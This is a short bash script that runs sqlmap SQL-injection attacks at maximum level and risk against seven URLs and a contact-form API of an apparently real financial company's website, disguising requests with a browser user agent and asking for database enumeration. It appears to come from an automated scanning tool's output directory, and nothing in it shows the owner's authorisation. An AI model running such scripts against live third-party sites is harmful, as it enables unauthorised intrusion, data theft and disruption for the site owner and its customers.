#!/bin/bash
cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/w2
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
run(){ n="$1"; shift
  sqlmap "$@" -A "$UA" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session \
   --time-sec=8 --retries=1 --output-dir=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/w2/sm_$n > /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/w2/sm_$n.log 2>&1
  echo "DONE $n rc=$?" >> /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/w2/progress.txt
}
run home_id   -u 'https://www.infinitycapital.bh/?id=1'
run home_page -u 'https://www.infinitycapital.bh/?page=2'
run api_id    -u 'https://www.infinitycapital.bh/api/?id=1'
run contact   -u 'https://www.infinitycapital.bh/contact?x=1'
run contact2  -u 'https://www.infinitycapital.bh/contact?cb=1&x=1'
run nextimg   -u 'https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75'
run apisend   -u 'https://www.infinitycapital.bh/api/send' --method=POST --data='fname=A&lname=B&areacode=%2B973&tel=3600000&cname=t&subject=s&msg=m&check=1&targets=%5B%5D'
echo ALLDONE >> /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/w2/progress.txt
